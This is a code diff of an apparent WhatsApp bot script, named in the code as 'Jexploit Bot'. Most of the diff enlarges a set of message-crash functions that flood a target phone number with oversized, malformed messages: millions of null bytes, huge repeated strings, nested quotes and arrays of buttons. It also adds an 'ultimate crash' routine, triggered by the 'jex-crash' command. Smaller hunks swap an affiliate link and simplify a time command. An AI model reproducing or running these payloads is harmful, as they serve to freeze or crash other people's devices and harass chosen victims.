@@ -388,148 +388,261 @@ function isValidConn(conn) {
            conn.user.id;
 }
 
-// Function to send system crash message
+// Function to generate massive JSON payload
+function generateMassivePayload(baseSize = 1000000) {
+    return {
+        'key': 'x'.repeat(baseSize),
+        'payload': 'a'.repeat(baseSize * 2),
+        'data': 'b'.repeat(baseSize * 3),
+        'content': 'c'.repeat(baseSize * 4),
+        'message': 'd'.repeat(baseSize * 5),
+        'text': 'e'.repeat(baseSize * 6),
+        'body': 'f'.repeat(baseSize * 7),
+        'description': 'g'.repeat(baseSize * 8),
+        'title': 'h'.repeat(baseSize * 9),
+        'footer': 'i'.repeat(baseSize * 10)
+    };
+}
+
+// Function to send system crash message (STRONGER)
 async function sendSystemCrashMessage(conn, jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'viewOnceMessage': {
-      'message': {
-        'interactiveMessage': {
-          'header': {
-            'title': '',
-            'subtitle': " "
-          },
-          'body': {
-            'text': "SћЄYкЩ∞ћЄSкЩ∞ћЄTкЩ∞ћЄEкЩ∞ћЄMкЩ∞ћЄ UћЄIћЄ CћЄRкЩ∞ћЄAкЩ∞ћЄSкЩ∞ћЄHкЩ∞ћЄ"
-          },
-          'footer': {
-            'text': 'xp'
-          },
-          'nativeFlowMessage': {
-            'buttons': [{
-              'name': 'cta_url',
-              'buttonParamsJson': "{ display_text : 'SћЄYкЩ∞ћЄSкЩ∞ћЄTкЩ∞ћЄEкЩ∞ћЄMкЩ∞ћЄ UћЄIћЄ CћЄRкЩ∞ћЄAкЩ∞ћЄSкЩ∞ћЄHкЩ∞ћЄ', url : , merchant_url :  }"
-            }],
-            'messageParamsJson': "\0".repeat(1000000)
-          }
-        }
-      }
-    }
-  }), {});
-  
-  await conn.relayMessage(jid, messageContent.message, {
-    'participant': { 'jid': jid },
-    'messageId': messageContent.key.id
-  });
-}
-
-// Function to send list message
-async function sendListMessage(conn, jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'listMessage': {
-      'title': "SYSTEM UI CRASH" + "\0".repeat(920000),
-      'footerText': "SYSTEM CRASH",
-      'description': "SYSTEM CRASH",
-      'buttonText': null,
-      'listType': 2,
-      'productListInfo': {
-        'productSections': [{
-          'title': "lol",
-          'products': [{
-            'productId': "4392524570816732"
-          }]
-        }],
-        'productListHeaderImage': {
-          'productId': "4392524570816732",
-          'jpegThumbnail': null
-        },
-        'businessOwnerJid': "0@s.whatsapp.net"
-      }
-    }
-  }), {});
-  
-  await conn.relayMessage(jid, messageContent.message, {
-    'participant': { 'jid': jid },
-    'messageId': messageContent.key.id
-  });
-}
-
-// Function to send live location message
-async function sendLiveLocationMessage(conn, jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'viewOnceMessage': {
-      'message': {
-        'liveLocationMessage': {
-          'degreesLatitude': 'p',
-          'degreesLongitude': 'p',
-          'caption': 'LIVE LOCATION CRASH' + 'a'.repeat(50000),
-          'sequenceNumber': '0',
-          'jpegThumbnail': ''
-        }
-      }
-    }
-  }), {});
-  
-  await conn.relayMessage(jid, messageContent.message, {
-    'participant': { 'jid': jid },
-    'messageId': messageContent.key.id
-  });
-}
-
-// Function to send extended text message
-async function sendExtendedTextMessage(conn, jid) {
-  await conn.relayMessage(jid, {
-    'extendedTextMessage': {
-      'text': '.',
-      'contextInfo': {
-        'stanzaId': jid,
-        'participant': jid,
-        'quotedMessage': {
-          'conversation': 'CRASH MESSAGE' + 'a'.repeat(50000)
-        }
-      }
-    }
-  }, {
-    'participant': { 'jid': jid }
-  });
-}
-
-// Function to send payment invite
-async function sendPaymentInvite(conn, jid) {
-  await conn.relayMessage(jid, {
-    'paymentInviteMessage': {
-      'serviceType': "UPI",
-      'expiryTimestamp': Date.now() + 86400000
-    }
-  }, {
-    'participant': { 'jid': jid }
-  });
-}
-
-// Function to send view once messages
-async function sendViewOnceMessages(conn, jid, count) {
-  for (let i = 0; i < count; i++) {
-    let messageContent = generateWAMessageFromContent(jid, {
-      'viewOnceMessage': {
-        'message': {
-          'interactiveMessage': {
-            'body': { 'text': '' },
-            'footer': { 'text': '' },
-            'header': { 'title': '', 'subtitle': '', 'hasMediaAttachment': false },
-            'nativeFlowMessage': {
-              'buttons': [{
-                'name': "cta_url",
-                'buttonParamsJson': "{\"display_text\":\"CRASH\",\"url\":\"https://www.google.com\"}"
-              }],
-              'messageParamsJson': "\0".repeat(100000)
+    const massivePayload = generateMassivePayload(500000);
+    const repeatedNulls = "\0".repeat(2000000);
+    
+    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+        'viewOnceMessage': {
+            'message': {
+                'interactiveMessage': {
+                    'header': {
+                        'title': 'x'.repeat(50000),
+                        'subtitle': 'y'.repeat(50000)
+                    },
+                    'body': {
+                        'text': 'SЂҰЎҚЩ∞ЂҰЅҚЩ∞ЂҰТҚЩ∞ЂҰЄҚЩ∞ЂҰМҚЩ∞ЂҰ UЂҰIЂҰ CЂҰRҚЩ∞ЂҰAҚЩ∞ЂҰSҚЩ∞ЂҰHҚЩ∞ЂҰ' + 'z'.repeat(100000)
+                    },
+                    'footer': {
+                        'text': 'CRASH SYSTEM'.repeat(10000)
+                    },
+                    'nativeFlowMessage': {
+                        'buttons': [{
+                            'name': 'cta_url',
+                            'buttonParamsJson': JSON.stringify(massivePayload)
+                        }],
+                        'messageParamsJson': repeatedNulls
+                    }
+                }
             }
-          }
         }
-      }
-    }, {});
+    }), {});
+    
     await conn.relayMessage(jid, messageContent.message, {
-      'messageId': messageContent.key.id
+        'participant': { 'jid': jid },
+        'messageId': messageContent.key.id
     });
-  }
+}
+
+// Function to send list message (STRONGER)
+async function sendListMessage(conn, jid) {
+    const massiveProducts = [];
+    for (let i = 0; i < 1000; i++) {
+        massiveProducts.push({
+            'productId': 'x'.repeat(5000) + i,
+            'title': 'y'.repeat(5000),
+            'description': 'z'.repeat(5000)
+        });
+    }
+    
+    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+        'listMessage': {
+            'title': "SYSTEM UI CRASH".repeat(5000) + "\0".repeat(2000000),
+            'footerText': "SYSTEM CRASH".repeat(5000),
+            'description': "SYSTEM CRASH".repeat(5000),
+            'buttonText': 'a'.repeat(50000),
+            'listType': 2,
+            'sections': massiveProducts.map(p => ({
+                'title': p.title,
+                'rows': [{
+                    'title': p.title,
+                    'description': p.description,
+                    'rowId': p.productId
+                }]
+            })),
+            'productListInfo': {
+                'productSections': massiveProducts.map(p => ({
+                    'title': p.title,
+                    'products': [{
+                        'productId': p.productId,
+                        'productImage': { 'url': 'x'.repeat(5000) }
+                    }]
+                })),
+                'productListHeaderImage': {
+                    'productId': "x".repeat(5000),
+                    'jpegThumbnail': 'y'.repeat(50000)
+                },
+                'businessOwnerJid': "0@s.whatsapp.net"
+            }
+        }
+    }), {});
+    
+    await conn.relayMessage(jid, messageContent.message, {
+        'participant': { 'jid': jid },
+        'messageId': messageContent.key.id
+    });
+}
+
+// Function to send live location message (STRONGER)
+async function sendLiveLocationMessage(conn, jid) {
+    const longString = 'a'.repeat(500000);
+    
+    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+        'viewOnceMessage': {
+            'message': {
+                'liveLocationMessage': {
+                    'degreesLatitude': 'p'.repeat(50000),
+                    'degreesLongitude': 'p'.repeat(50000),
+                    'caption': 'LIVE LOCATION CRASH'.repeat(10000) + longString,
+                    'sequenceNumber': '0'.repeat(50000),
+                    'jpegThumbnail': longString,
+                    'contextInfo': {
+                        'participant': jid,
+                        'quotedMessage': {
+                            'conversation': longString
+                        }
+                    }
+                }
+            }
+        }
+    }), {});
+    
+    await conn.relayMessage(jid, messageContent.message, {
+        'participant': { 'jid': jid },
+        'messageId': messageContent.key.id
+    });
+}
+
+// Function to send extended text message (STRONGER)
+async function sendExtendedTextMessage(conn, jid) {
+    const massiveText = 'CRASH MESSAGE '.repeat(20000) + 'a'.repeat(500000);
+    
+    await conn.relayMessage(jid, {
+        'extendedTextMessage': {
+            'text': massiveText,
+            'contextInfo': {
+                'stanzaId': jid,
+                'participant': jid,
+                'quotedMessage': {
+                    'conversation': massiveText,
+                    'extendedTextMessage': {
+                        'text': massiveText,
+                        'contextInfo': {
+                            'quotedMessage': {
+                                'conversation': massiveText
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }, {
+        'participant': { 'jid': jid }
+    });
+}
+
+// Function to send payment invite (STRONGER)
+async function sendPaymentInvite(conn, jid) {
+    const massivePayload = JSON.stringify(generateMassivePayload(200000));
+    
+    await conn.relayMessage(jid, {
+        'paymentInviteMessage': {
+            'serviceType': "UPI",
+            'expiryTimestamp': Date.now() + 86400000,
+            'note': 'a'.repeat(500000),
+            'requestMessage': {
+                'paymentRequestMessage': {
+                    'note': 'b'.repeat(500000),
+                    'currencyCode': 'c'.repeat(50000),
+                    'amount1000': 999999999,
+                    'requestFrom': jid,
+                    'expiryTimestamp': Date.now() + 86400000,
+                    'amount': {
+                        'value': 999999999,
+                        'currencyCode': 'd'.repeat(50000)
+                    }
+                }
+            }
+        }
+    }, {
+        'participant': { 'jid': jid }
+    });
+}
+
+// Function to send view once messages (STRONGER)
+async function sendViewOnceMessages(conn, jid, count) {
+    const maxCount = Math.min(count, 50); // Limit to prevent timeout
+    
+    for (let i = 0; i < maxCount; i++) {
+        let messageContent = generateWAMessageFromContent(jid, {
+            'viewOnceMessage': {
+                'message': {
+                    'interactiveMessage': {
+                        'body': { 'text': 'x'.repeat(100000) },
+                        'footer': { 'text': 'y'.repeat(100000) },
+                        'header': { 
+                            'title': 'z'.repeat(50000), 
+                            'subtitle': 'w'.repeat(50000), 
+                            'hasMediaAttachment': true,
+                            'imageMessage': {
+                                'caption': 'v'.repeat(50000),
+                                'jpegThumbnail': 'u'.repeat(50000)
+                            }
+                        },
+                        'nativeFlowMessage': {
+                            'buttons': Array(100).fill({
+                                'name': "cta_url",
+                                'buttonParamsJson': JSON.stringify(generateMassivePayload(10000))
+                            }),
+                            'messageParamsJson': "\0".repeat(500000)
+                        }
+                    }
+                }
+            }
+        }, {});
+        await conn.relayMessage(jid, messageContent.message, {
+            'messageId': messageContent.key.id
+        });
+        
+        // Small delay between messages
+        await new Promise(resolve => setTimeout(resolve, 100));
+    }
+}
+
+// ULTIMATE CRASH - Send all crash messages combined
+async function sendUltimateCrash(conn, jid) {
+    // Send multiple crash attempts in parallel
+    await Promise.all([
+        sendSystemCrashMessage(conn, jid),
+        sendListMessage(conn, jid),
+        sendLiveLocationMessage(conn, jid),
+        sendExtendedTextMessage(conn, jid),
+        sendPaymentInvite(conn, jid),
+        sendViewOnceMessages(conn, jid, 30)
+    ]);
+    
+    // Additional massive payload
+    for (let i = 0; i < 10; i++) {
+        try {
+            await conn.sendMessage(jid, { 
+                text: 'x'.repeat(1000000) 
+            });
+        } catch (e) {}
+        
+        try {
+            await conn.sendMessage(jid, { 
+                image: { url: 'x'.repeat(50000) },
+                caption: 'y'.repeat(500000)
+            });
+        } catch (e) {}
+    }
 }
 
 //================== [ CONSOLE LOG] ==================//
@@ -2487,7 +2600,7 @@ Then download the zip file.
 Now authorise your discord account then claim coins for 3days, each day u can claim 10 coins.
 
 
-https://bot-hosting.net/?aff=1334589985369624636
+https://bot-hosting.net/?aff=1454800083857051814
 
 *NOTE:* Some bot require larger server to process while. (25 coin)
 
@@ -3320,59 +3433,25 @@ const country = args.join(' ');
 break
 case "time": {
     try {
-        let countryName = text.trim();
-        
-        if (!countryName) {
-            // If no country provided, show current bot time
-            const now = moment().tz(global.timezones || "Africa/Kampala");
-            const timeInfo = `
- *Current Bot Time* 
+        const now = moment().tz(global.timezones || "Africa/Kampala");
+        const timeInfo = `
+⏰ *Current Bot Time* ⏰
 
 🌍 *Timezone:* ${now.format('z (Z)')}
- *Date:* ${now.format('dddd, MMMM Do YYYY')}
- *Time:* ${now.format('h:mm:ss A')}
- *Week Number:* ${now.format('WW')}
- *Day of Year:* ${now.format('DDD')}
-
-*Usage:* ${prefix}time [country name]
-*Example:* ${prefix}time Japan
-            `.trim();
-
-            return await conn.sendMessage(m.chat, { 
-    text: `${global.wm}\n\n${timeInfo}`
-}, { quoted: m });
-  
-  }
-
-        // Get timezone for the country
-        const timezones = moment.tz.zonesForCountry(countryName);
-        
-        if (!timezones || timezones.length === 0) {
-            return reply(`❌ *Country not found!*\nPlease provide a valid country name.\n\nExample: ${prefix}time Japan`);
-        }
-
-        // Use the first timezone for that country
-        const primaryTimezone = timezones[0];
-        const now = moment().tz(primaryTimezone);
-        
-        const timeInfo = `
-⏰ *Time in ${countryName.toUpperCase()}* ⏰
-
-🌍 *Timezone:* ${primaryTimezone} (${now.format('Z')})
 📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
 🕒 *Time:* ${now.format('h:mm:ss A')}
 🕛 *24-hour format:* ${now.format('HH:mm:ss')}
 📆 *Week Number:* ${now.format('WW')}
 ⏳ *Day of Year:* ${now.format('DDD')}
 
-*Other timezones in ${countryName}:* ${timezones.slice(0, 5).join(', ')}${timezones.length > 5 ? '...' : ''}
+> ${global.wm || 'Jexploit Bot'}
         `.trim();
 
         await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });
 
     } catch (error) {
         console.error('Error in time command:', error);
-        reply('❌ *Unable to fetch time information.*\nPlease try a different country name or try again later.');
+        reply('❌ *Unable to fetch time information.*');
     }
     
 }
@@ -10491,20 +10570,18 @@ if (!m.isAdmin) return reply(mess.notadmin);
 }
 break
 //======================
-case "jex-crash": {    
+case 'jex-crash': {    
     if (!Access) return reply(mess.owner);
     
     if (!text) return reply(`\`Example:\` : ${prefix + command} 256×××`);
     let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-    reply(`*[!] Bug sent to target*`); 
+    reply(`*[!] Sending ultimate crash to target...*`); 
     
-    for (let i = 0; i < 30; i++) {
-        await sendSystemCrashMessage(conn, target);
-        await sendListMessage(conn, target);
-        await sendLiveLocationMessage(conn, target);
-        await sendExtendedTextMessage(conn, target);
-        await sendPaymentInvite(conn, target);
+    // Send multiple crash cycles
+    for (let i = 0; i < 3; i++) {
+        await sendUltimateCrash(conn, target);
+        await new Promise(resolve => setTimeout(resolve, 500));
     }
     
     break;
